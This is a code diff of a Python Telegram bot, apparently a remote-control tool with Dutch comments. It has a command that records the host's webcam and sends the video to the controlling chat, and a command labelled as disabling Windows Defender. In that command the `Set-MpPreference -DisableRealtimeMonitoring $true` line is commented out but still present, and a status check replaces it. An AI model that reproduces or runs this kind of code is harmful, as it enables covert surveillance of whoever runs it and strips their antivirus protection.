@@ -3,9 +3,8 @@ from telegram import Update
 from telegram.ext import ContextTypes
 from functions import *
 
+
 # ASCII banner
-# update info over binnenkomende bericht
-# context extra informatie die je kan gebruiken
 async def banner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(get_banner())
 
@@ -15,15 +14,12 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # Reactie om alles dat geen slash command is
 async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "Ik reageer alleen op slash commands. Gebruik /help voor een overzicht van alle commands."
-    )
+    await update.message.reply_text("Ik reageer alleen op slash commands. Gebruik /help voor een overzicht van alle commands.")
 
 # webcam recording maken
 async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat recording begonnen is
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Webcam opname is begonnen...")
-
     # start recording
     # Source: https://stackoverflow.com/questions/47615956/send-video-through-telegram-python-api
     await context.bot.send_video(
@@ -35,7 +31,8 @@ async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Windows defender uitzetten
 async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # meld dat Windows defender uit is
-    powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
+    # powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
+    powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     commandOutput = powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
